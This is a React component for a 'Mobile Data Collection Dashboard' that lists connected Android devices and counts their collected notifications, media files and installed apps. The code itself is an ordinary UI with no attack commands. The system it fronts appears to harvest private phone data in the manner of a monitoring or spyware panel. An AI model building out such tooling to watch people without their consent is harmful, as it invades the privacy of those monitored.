import React, { useState, useEffect, useCallback } from 'react';
import { Link } from 'react-router-dom';
import { toast } from 'react-toastify';
import './Dashboard.css';

const Dashboard = () => {
  const [users, setUsers] = useState([]);
  const [stats, setStats] = useState({
    totalUsers: 0,
    totalNotifications: 0,
    totalMedia: 0,
    totalDevices: 0
  });
  const [loading, setLoading] = useState(true);

  const fetchUsers = useCallback(async () => {
    try {
      const response = await fetch('/api/devices');
      const data = await response.json();
      
      if (data.success) {
        setUsers(data.data);
      } else {
        toast.error('Failed to fetch devices');
      }
    } catch (error) {
      console.error('Error fetching devices:', error);
      toast.error('Error fetching devices');
    } finally {
      setLoading(false);
    }
  }, []);

  const fetchStats = useCallback(async () => {
    try {
      const response = await fetch('/api/admin/stats');
      const data = await response.json();
      
      if (data) {
        setStats({
          totalUsers: data.users || 0,
          totalNotifications: data.notifications || 0,
          totalMedia: data.media || 0,
          totalDevices: data.devices || 0
        });
      }
    } catch (error) {
      console.error('Error fetching stats:', error);
    }
  }, []);

  useEffect(() => {
    fetchUsers();
    fetchStats();
  }, [fetchUsers, fetchStats]);

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const getDeviceInfo = (deviceInfo) => {
    if (!deviceInfo) return 'No device info';
    return `${deviceInfo.manufacturer || 'Unknown'} ${deviceInfo.model || 'Device'}`;
  };

  if (loading) {
    return (
      <div className="dashboard-container">
        <div className="loading">Loading dashboard...</div>
      </div>
    );
  }

  return (
    <div className="dashboard-container">
      <header className="dashboard-header">
        <h1>📱 Mobile Data Collection Dashboard</h1>
        <p>Monitor collected data from mobile devices</p>
      </header>

      {/* Stats Cards */}
      <div className="stats-grid">
        <div className="stat-card">
          <div className="stat-icon">👥</div>
          <div className="stat-content">
            <h3>{stats.totalUsers}</h3>
            <p>Active Devices</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">🔔</div>
          <div className="stat-content">
            <h3>{stats.totalNotifications}</h3>
            <p>Notifications</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📸</div>
          <div className="stat-content">
            <h3>{stats.totalMedia}</h3>
            <p>Media Files</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📱</div>
          <div className="stat-content">
            <h3>{stats.totalDevices}</h3>
            <p>Total Devices</p>
          </div>
        </div>
      </div>

      {/* Navigation */}
      <div className="nav-buttons">
        <Link to="/notifications" className="nav-button">
          🔔 View All Notifications
        </Link>
        <Link to="/media" className="nav-button">
          📸 View All Media
        </Link>
        <Link to="/admin" className="nav-button admin-button">
          🔐 Admin Dashboard
        </Link>
      </div>

      {/* Users Table */}
      <div className="users-section">
        <h2>📱 Connected Devices</h2>
        
        {users.length === 0 ? (
          <div className="no-data">
            <p>No devices connected yet</p>
            <p>Install the mobile app to start collecting data</p>
          </div>
        ) : (
          <div className="users-grid">
            {users.map((device) => (
              <div key={device._id} className="user-card">
                <div className="user-header">
                  <div className="user-avatar">📱</div>
                  <div className="user-info">
                    <h3>Device {device.deviceId}</h3>
                    <p>{getDeviceInfo(device.deviceInfo)}</p>
                  </div>
                </div>
                
                <div className="user-details">
                  <div className="detail-item">
                    <span className="label">Device ID:</span>
                    <span className="value">{device.deviceId}</span>
                  </div>
                  
                  {device.deviceInfo && (
                    <>
                      <div className="detail-item">
                        <span className="label">Android Version:</span>
                        <span className="value">{device.deviceInfo.androidVersion || 'Unknown'}</span>
                      </div>
                      <div className="detail-item">
                        <span className="label">SDK Version:</span>
                        <span className="value">{device.deviceInfo.sdkVersion || 'Unknown'}</span>
                      </div>
                    </>
                  )}
                  
                  <div className="detail-item">
                    <span className="label">Installed Apps:</span>
                    <span className="value">{device.installedApps?.length || 0}</span>
                  </div>
                  
                  <div className="detail-item">
                    <span className="label">Connected:</span>
                    <span className="value">{formatDate(device.createdAt)}</span>
                  </div>
                  
                  {device.lastAppsUpdate && (
                    <div className="detail-item">
                      <span className="label">Last Update:</span>
                      <span className="value">{formatDate(device.lastAppsUpdate)}</span>
                    </div>
                  )}
                </div>
                
                <div className="user-actions">
                  <Link to={`/user/${device.deviceId}`} className="action-button">
                    View Details
                  </Link>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="dashboard-footer">
        <div className="footer-links">
          <Link to="/privacy" className="footer-link">Privacy Policy</Link>
          <span className="footer-separator">|</span>
          <Link to="/terms" className="footer-link">Terms of Service</Link>
        </div>
        <div className="footer-copyright">
          © 2024 Your Company. All rights reserved.
        </div>
      </div>
    </div>
  );
};

export default Dashboard; 